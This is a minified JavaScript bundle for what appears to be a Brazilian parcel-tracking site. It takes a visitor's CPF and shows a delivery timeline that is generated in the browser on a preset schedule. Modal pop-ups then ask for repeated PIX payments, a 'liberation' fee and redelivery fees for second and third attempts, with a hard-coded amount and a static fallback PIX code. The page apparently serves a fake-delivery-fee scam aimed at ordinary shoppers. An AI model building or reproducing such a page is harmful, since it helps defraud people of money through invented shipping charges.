i=document.createElement("div");i.className="modal-overlay",i.id="deliveryPaymentModal",i.style.display="flex";let n,s;!a&&this.deliveryPixData&&this.deliveryPixData.pixPayload?(n=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`,s=this.deliveryPixData.pixPayload,console.log("✅ Usando PIX real do Zentra Pay para reenvio")):(n="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",s="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",console.log("⚠️ Usando PIX estático como fallback para reenvio")),i.innerHTML=`
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Taxa de Reenvio - ${e}ª Tentativa</h2>
                    <button class="professional-modal-close" id="closeDeliveryPaymentModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${t.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de Reenvio - ${e}ª Tentativa</span>
                            <span class="fee-amount">R$ ${t.toFixed(2)}</span>
                        </div>
                    </div>

                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${n}" alt="QR Code PIX Reenvio" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${s}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div style="text-align: center; margin-top: 20px;">
                            <button id="simulateDeliveryPaymentButton" class="liberation-button-timeline" data-step-id="${o}" data-attempt="${e}">
                                <i class="fas fa-credit-card"></i> Simular Pagamento
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `,document.body.appendChild(i),document.body.style.overflow="hidden",this.setupDeliveryPaymentModalEvents(i,o,e),console.log(`💳 Modal de pagamento para ${e}ª tentativa exibido - R$ ${t.toFixed(2)}`)}setupDeliveryPaymentModalEvents(e,t,o){const a=e.querySelector("#closeDeliveryPaymentModal");a&&a.addEventListener("click",()=>{this.closeDeliveryPaymentModal()});const i=e.querySelector("#copyDeliveryPixButton");i&&i.addEventListener("click",()=>{this.copyDeliveryPixCode()});const n=e.querySelector("#simulateDeliveryPaymentButton");n&&n.addEventListener("click",()=>{this.simulateDeliveryPayment(t,o)}),e.addEventListener("click",s=>{s.target===e&&this.closeDeliveryPaymentModal()})}copyDeliveryPixCode(){const e=document.getElementById("deliveryPixCode"),t=document.getElementById("copyDeliveryPixButton");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{console.log("✅ PIX de reenvio copiado:",e.value.substring(0,50)+"..."),this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(o){console.error("❌ Erro ao copiar PIX de reenvio:",o),this.showError("Erro ao copiar código PIX. Tente selecionar e copiar manualmente.")}}simulateDeliveryPayment(e,t){console.log(`💳 Simulando pagamento para ${t}ª tentativa de entrega...`),this.closeDeliveryPaymentModal(),this.hideDeliveryButton(e),this.showDeliveryPaymentSuccess(t),setTimeout(()=>{this.addPostDeliveryPaymentSteps(e,t)},1e3)}hideDeliveryButton(e){const t=document.querySelector(`[data-step-id="${e}"]`);t&&(t.style.display="none",console.log(`✅ Botão de reenvio da etapa ${e} ocultado`))}showDeliveryPaymentSuccess(e){const t=document.createElement("div");t.className="payment-success-notification",t.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `,t.innerHTML=`
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${e}ª tentativa de reenvio autorizada.</div>
            </div>
        `,document.body.appendChild(t),setTimeout(()=>{t.parentNode&&t.remove()},5e3)}addPostDeliveryPaymentSteps(e,t){const o=document.getElementById("trackingTimeline");if(!o)return;const a=this.getStageNames();let i=[];t===1?i=[17,18,19]:t===2?i=[21,22,23]:t===3&&(i=[25,26]);const n=[0,2*60*1e3,2*60*60*1e3];i.forEach((s,r)=>{const l=n[r]||0;setTimeout(()=>{const u=new Date,d=this.createTimelineItem({id:s,date:u,title:a[s],description:a[s],isChina:!1,completed:!0,needsLiberation:!1,needsDeliveryPayment:s===20||s===24,deliveryAttempt:s===20?2:s===24?3:null},r===i.length-1);o.appendChild(d),setTimeout(()=>{d.style.opacity="1",d.style.transform="translateY(0)"},100),d.scrollIntoView({behavior:"smooth",block:"center"}),(s===20||s===24)&&setTimeout(()=>{this.highlightDeliveryButton(s)},1e3)},l)})}highlightDeliveryButton(e){const t=document.querySelector(`[data-step-id="${e}"]`);t&&(this.scrollToElement(t,window.innerHeight/2),setTimeout(()=>{t.style.animation="pulse 2s infinite, glow 2s ease-in-out",t.style.boxShadow="0 0 20px rgba(30, 74, 107, 0.8)",setTimeout(()=>{t.style.animation="pulse 2s infinite",t.style.boxShadow="0 4px 15px rgba(30, 74, 107, 0.4)"},6e3)},500))}closeDeliveryPaymentModal(){const e=document.getElementById("deliveryPaymentModal");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}guideToCopyButton(){const e=document.getElementById("copyPixButtonModal"),t=document.querySelector(".pix-copy-section");if(!e||!t)return;t.style.position="relative";const o=document.createElement("div");o.className="copy-guide-indicator",o.innerHTML="👆 Copie o código PIX aqui",o.style.cssText=`
            position: absolute;
            top: -35px;
            right: 0;
            background: #ff6b35;
            color: white;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            animation: bounceIn 0.6s ease, fadeOutGuide 4s ease 2s forwards;
            z-index: 10;
            white-space: nowrap;
            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
        `,t.appendChild(o),t.style.animation="highlightSection 3s ease",setTimeout(()=>{t.scrollIntoView({behavior:"smooth",block:"center"})},200),setTimeout(()=>{o.parentNode&&o.remove(),t.style.animation=""},6e3)}closeModal(e){const t=document.getElementById(e);t&&(t.style.display="none",document.body.style.overflow="auto")}toggleAccordion(){const e=document.getElementById("detailsContent"),t=document.querySelector(".toggle-icon");!e||!t||(e.classList.contains("expanded")?(e.classList.remove("expanded"),t.classList.remove("rotated")):(e.classList.add("expanded"),t.classList.add("rotated")))}copyPixCode(e,t){const o=document.getElementById(e),a=document.getElementById(t);if(!(!o||!a))try{o.select(),o.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(o.value).then(()=>{console.log("✅ PIX copiado via Clipboard API:",o.value.substring(0,50)+"..."),this.showCopySuccess(a)}).catch(()=>{this.fallbackCopy(o,a)}):this.fallbackCopy(o,a)}catch(i){console.error("❌ Erro ao copiar PIX:",i),this.showError("Erro ao copiar código PIX. Tente selecionar e copiar manualmente.")}}fallbackCopy(e,t){try{if(document.execCommand("copy"))console.log("✅ PIX copiado via execCommand:",e.value.substring(0,50)+"..."),this.showCopySuccess(t);else throw new Error("execCommand falhou")}catch(o){console.error("❌ Fallback copy falhou:",o),this.showError("Erro ao copiar. Selecione o texto e use Ctrl+C.")}}showCopySuccess(e){const t=e.innerHTML;e.innerHTML='<i class="fas fa-check"></i> Copiado!',e.style.background="#27ae60",setTimeout(()=>{e.innerHTML=t,e.style.background=""},2e3)}handleAutoFocus(){if(new URLSearchParams(window.location.search).get("focus")==="cpf"){setTimeout(()=>{const o=document.getElementById("cpfInput");if(o){const a=document.querySelector(".tracking-hero");a&&this.scrollToElement(a,0),setTimeout(()=>{o.focus(),/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&(o.setAttribute("inputmode","numeric"),o.setAttribute("pattern","[0-9]*"),o.click())},800)}},100);const t=window.location.pathname;window.history.replaceState({},document.title,t)}}clearOldData(){try{Object.keys(localStorage).forEach(t=>{t.startsWith("tracking_")&&localStorage.removeItem(t)})}catch(e){console.error("Erro ao limpar dados antigos:",e)}}saveTrackingData(){if(!(!this.currentCPF||!this.trackingData))try{localStorage.setItem(`tracking_${this.currentCPF}`,JSON.stringify(this.trackingData))}catch(e){console.error("Erro ao salvar dados:",e)}}getFirstAndLastName(e){const t=e.trim().split(" ");if(console.log("🔍 Processando nome completo:",e),console.log("🔍 Nomes separados:",t),t.length===1)return console.log("✅ Nome único encontrado:",t[0]),t[0];const o=`${t[0]} ${t[t.length-1]}`;return console.log("✅ Nome processado:",o),o}updateElement(e,t){console.log(`🔄 Tentando atualizar elemento '${e}' com texto:`,t);const o=document.getElementById(e);if(o){const a=o.textContent;o.textContent=t,console.log(`✅ Elemento '${e}' atualizado:`),console.log(`   Texto anterior: "${a}"`),console.log(`   Texto novo: "${t}"`)}else console.error(`❌ Elemento '${e}' não encontrado no DOM`),console.log("🔍 Elementos disponíveis:",Array.from(document.querySelectorAll("[id]")).map(a=>a.id))}showElement(e){const t=document.getElementById(e);t&&(t.style.display="block")}showLoadingNotification(){const e=document.createElement("div");e.id="trackingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");if(t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(45deg, #1e4a6b, #2c5f8a); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden",!document.getElementById("trackingAnimations")){const o=document.createElement("style");o.id="trackingAnimations",o.textContent=`
                @keyframes progressBar {
                    from { width: 0%; }
                    to { width: 100%; }
                }
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                @keyframes slideUp {
                    from { opacity: 0; transform: translateY(50px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `,document.head.appendChild(o)}}closeLoadingNotification(){const e=document.getElementById("trackingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}showError(e){const t=document.querySelector(".error-message");t&&t.remove();const o=document.createElement("div");o.className="error-message",o.style.cssText=`
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `,o.textContent=e;const a=document.querySelector(".tracking-form");a&&(a.appendChild(o),setTimeout(()=>{o.parentNode&&(o.style.animation="slideUp 0.3s ease",setTimeout(()=>o.remove(),300))},5e3))}scrollToElement(e,t=0){if(!e)return;const a=e.getBoundingClientRect().top+window.pageYOffset-t;window.scrollTo({top:a,behavior:"smooth"})}animateTimeline(){document.querySelectorAll(".timeline-item").forEach((t,o)=>{setTimeout(()=>{t.style.opacity="1",t.style.transform="translateY(0)"},o*100)})}setZentraPayApiSecret(e){const t=this.zentraPayService.setApiSecret(e);return t?console.log("✅ API Secret Zentra Pay configurada com sucesso"):console.error("❌ Falha ao configurar API Secret Zentra Pay"),t}}window.setZentraPayApiSecret=function(m){return window.trackingSystemInstance?window.trackingSystemInstance.setZentraPayApiSecret(m):(window.ZENTRA_PAY_SECRET_KEY=m,localStorage.setItem("zentra_pay_secret_key",m),console.log("🔑 API Secret armazenada para uso posterior"),!0)};window.valor_em_reais=26.34;(function(){console.log("=== SISTEMA DE RASTREAMENTO APRIMORADO CARREGANDO ===");let m;function e(){console.log("=== INICIALIZANDO PÁGINA DE RASTREAMENTO APRIMORADA ===");try{if(h.init(),console.log("✓ Navegação inicializada"),!m){const n=new URLSearchParams(window.location.search).get("origem")==="vega";m=new P,window.trackingSystemInstance=m,console.log("✓ Sistema de rastreamento aprimorado criado")}a(),console.log("✓ Header scroll configurado"),o(),t(),console.log("=== PÁGINA DE RASTREAMENTO APRIMORADA INICIALIZADA COM SUCESSO ===")}catch(i){console.error("❌ Erro na inicialização da página de rastreamento:",i),setTimeout(e,2e3)}}function t(){const i=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key");i&&i!=="SUA_SECRET_KEY_AQUI"&&m?(m.setZentraPayApiSecret(i),console.log("✓ API Secret Zentra Pay configurada automaticamente")):console.warn('⚠️ API Secret Zentra Pay não configurada. Configure usando: configurarZentraPay("sua_chave")')}function o(){["trackingForm","cpfInput","trackButton","liberationModal","pixCodeModal","realPixQrCode"].forEach(n=>{document.getElementById(n)?console.log(`✓ Elemento encontrado: ${n}`):console.warn(`⚠️ Elemento não encontrado: ${n}`)})}function a(){window.addEventListener("scroll",function(){const i=document.querySelector(".header");i&&(i.style.backgroundColor="rgba(255, 255, 255, 0.1)",i.style.backdropFilter="blur(10px)")})}document.readyState==="loading"?(document.addEventListener("DOMContentLoaded",e),console.log("📅 Aguardando DOMContentLoaded")):(e(),console.log("📄 DOM já carregado, inicializando imediatamente")),setTimeout(e,100),setTimeout(e,500),setTimeout(e,1e3),setTimeout(e,2e3),console.log("=== SCRIPT DE RASTREAMENTO APRIMORADO CARREGADO ===")})();
